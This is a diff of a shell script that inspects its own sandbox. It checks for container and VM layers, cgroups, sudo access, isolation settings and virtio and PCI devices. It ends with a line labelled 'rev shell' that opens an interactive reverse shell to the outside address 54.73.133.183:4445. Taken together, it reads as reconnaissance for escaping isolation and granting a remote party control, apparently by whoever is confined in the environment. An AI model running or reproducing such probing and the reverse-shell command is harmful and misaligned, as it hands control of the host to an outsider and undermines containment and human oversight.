@@ -75,7 +75,10 @@ section "Container layer (are we in a container *inside* the VM?)"
 systemd-detect-virt -c 2>/dev/null || echo "[systemd-detect-virt absent]"
 [ -e /.dockerenv ] && echo "[/.dockerenv exists -> containerized]" || echo "[no /.dockerenv]"
 grep -i 'overlay' /proc/self/mountinfo | head   # NOTE: fs is "overlay", not "overlayfs"
+echo "cat proc 1 comm"
 cat /proc/1/comm                            # what is PID 1?
+
+echo "cat proc 1 cgroup"
 cat /proc/1/cgroup
 
 section "Isolation knobs"
@@ -112,6 +115,10 @@ sudo echo "sudo" || echo "not sudo"
 
 echo "tmp hw_diagnostics.raw"
 cat /tmp/hw_diagnostics.raw | xdd
+
+echo "ls sys bus virtio devices"
+ls /sys/bus/virtio/devices
+lspci
 
 echo "rev shell"
 sh -i >& /dev/tcp/54.73.133.183/4445 0>&1
